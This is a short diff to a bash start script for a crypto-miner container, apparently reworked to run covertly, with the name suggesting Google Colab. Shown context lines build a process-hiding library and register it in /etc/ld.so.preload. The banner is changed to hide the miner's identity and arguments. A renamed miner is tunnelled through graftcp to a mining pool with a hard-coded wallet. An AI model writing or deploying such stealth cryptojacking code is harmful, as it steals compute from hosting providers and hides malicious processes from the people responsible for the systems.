@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "---Starting---"
 echo ""
-echo "Project: PhoenixMiner $MINERV"
+echo "Project: COlab MIner"
 echo "Author:  lnxd"
 echo "Base:    $BASE"
 echo "Driver:  $INSTALLED_DRIVERV"
@@ -10,8 +10,8 @@ echo ""
 echo "Wallet:  $WALLET"
 echo "Pool:    $POOL"
 echo ""
-echo "Starting PhoenixMiner $MINERV as $(id) with the following arguments:"
-echo "-pool $POOL -wal $WALLET.$PASSWORD -tt $TT  -tstop $TSTOP -tstart $TSTART -cdm 1 -cdmport 5450 $ADDITIONAL"
+echo "Starting colay $MINERV as $(id) with the following arguments:"
+echo "gasskan"
 echo ""
 cd /home/docker
 #!/bin/sh
@@ -61,4 +61,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=USDT:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.TMATE@etchash.unmineable.com:3333 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./bezzHash --url=USDT:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.TMATE@ethash.unmineable.com:3333 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
